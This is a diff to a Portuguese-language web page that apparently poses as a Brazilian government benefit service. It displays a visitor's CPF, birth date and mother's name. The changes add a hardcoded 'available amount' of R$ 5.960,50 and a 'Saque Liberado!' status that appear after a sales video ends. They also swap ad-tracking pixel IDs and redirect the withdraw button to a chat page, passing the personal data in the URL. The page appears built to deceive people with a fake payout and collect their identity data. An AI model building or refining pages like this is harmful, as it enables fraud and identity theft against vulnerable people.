@@ -8,7 +8,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 ;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
 
 
-  ttq.load('D6ROQ3BC77UA8MCFBSDG');
+  ttq.load('D704EARC77U5LJB3K6EG');
   ttq.page();
 }(window, document, 'ttq');
 </script>
@@ -22,7 +22,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
   defer
 ></script>
   <script>
-  window.tikTokPixelId = "69b78d959dcfda60eb53f101";
+  window.tikTokPixelId = "69c047cc96c20f4f6da4d61c";
   var a = document.createElement("script");
   a.setAttribute("async", "");
   a.setAttribute("defer", "");
@@ -318,6 +318,21 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
       color: var(--gov-blue-primary);
       width: 16px;
     }
+
+    /* ALTERAÇÃO 1 — status em andamento destacado */
+    #status-item {
+      background: #EBF3FF;
+      border-left: 4px solid var(--gov-blue-primary);
+      border-radius: 6px;
+      padding: 10px 12px !important;
+      gap: 10px !important;
+    }
+    #status-item i { color: var(--gov-blue-primary) !important; font-size: 15px; }
+    #status-item span { color: var(--gov-blue-primary); font-weight: 600; }
+
+    /* ALTERAÇÃO 2 — linha valor disponível */
+    #saque-liberado-card strong { color: var(--gov-green); font-weight: 700; }
+
     .button-saque {
       display: none;
       margin-top: 24px;
@@ -686,9 +701,15 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
         <i class="fas fa-female"></i>
         <span id="mother-value">---</span>
       </div>
+      <!-- ALTERAÇÃO 1: status em andamento mais destacado -->
       <div class="info-item" id="status-item">
-        <i class="fas fa-search"></i>
-        <span>Sua consulta está em andamento...</span>
+        <i class="fas fa-spinner fa-spin"></i>
+        <span id="status-span">Consulta em andamento, aguarde...</span>
+      </div>
+      <!-- ALTERAÇÃO 2: saque liberado com valor (oculto até finalizar vsl) -->
+      <div class="info-item" id="saque-liberado-card" style="display:none;">
+        <i class="fas fa-money-bill-wave"></i>
+        <span>Valor disponível: <strong>R$ 5.960,50</strong></span>
       </div>
     </div>
     <button class="button-saque" id="button-saque">Efetuar Saque Agora</button>
@@ -865,9 +886,20 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
     function finalizeProgress() {
       videoCompleted = true;
       elements.resgateOverlay.style.display = 'flex';
-      elements.statusItem.innerHTML = `<i class="fas fa-search"></i> Saque liberado.`;
-      elements.buttonSaque.style.display = 'block';
       elements.progressBar.style.width = '100%';
+
+      // ALTERAÇÃO 1: atualiza status para liberado
+      elements.statusItem.style.background = '#E9F7EC';
+      elements.statusItem.style.borderLeftColor = '#168821';
+      elements.statusItem.querySelector('i').className = 'fas fa-check-circle';
+      elements.statusItem.querySelector('i').style.color = '#168821';
+      document.getElementById('status-span').textContent = 'Saque Liberado!';
+      document.getElementById('status-span').style.color = '#168821';
+
+      // ALTERAÇÃO 2: exibe linha com valor
+      document.getElementById('saque-liberado-card').style.display = 'flex';
+
+      elements.buttonSaque.style.display = 'block';
     }
 
     function initFacebookComments() {
@@ -995,7 +1027,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
         elements.nameSpan.textContent = nome_ok;
         document.getElementById('header-user-name').textContent = nome_ok.split(' ')[0];
         elements.cpfSpan.textContent = formatarCPF1(userData.cpf || cleanCPF);
-        elements.birthSpan.textContent = userData.nascimento || '';
+        elements.birthSpan.textContent = (userData.nascimento || '').replace(/-/g, '/');
         elements.motherSpan.textContent = userData.mae ? formatarNomeCompleto(userData.mae) : 'Não Informado';
 
       } catch (err) {
@@ -1016,7 +1048,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
         params.set('nascimento', userData.nascimento);
         params.set('cpf', formatarCPF1(userData.cpf || ''));
       }
-      window.location.href = `../verificar.html?${params.toString()}`;
+      window.location.href = `../chat.html?${params.toString()}`;
     });
 
     fetchUserData();
